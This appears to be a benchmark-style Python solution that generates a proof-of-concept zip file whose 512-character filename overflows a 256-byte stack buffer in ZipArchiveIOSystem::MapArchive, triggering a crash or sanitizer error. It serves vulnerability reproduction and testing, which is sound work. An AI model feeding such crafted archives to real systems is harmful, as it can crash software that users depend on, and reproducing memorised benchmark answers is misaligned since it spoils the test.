import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in ZipArchiveIOSystem::MapArchive.
        The vulnerability is caused by copying a filename from the zip archive into a fixed 256-byte buffer.
        """
        # Create an in-memory bytes buffer to hold the zip file
        buffer = io.BytesIO()
        
        # Create a ZipFile object. 
        # ZIP_STORED is used to store the file without compression.
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The buffer size in the vulnerable function is 256 bytes.
            # We construct a filename significantly larger than 256 bytes (e.g., 512 bytes)
            # to ensure we overflow the buffer and trigger a crash or sanitizer error.
            overflow_filename = "A" * 512
            
            # Write a file entry into the zip archive with the malicious filename.
            # The content of the file can be empty.
            zf.writestr(overflow_filename, b"")
            
        # Return the raw bytes of the generated zip archive
        return buffer.getvalue()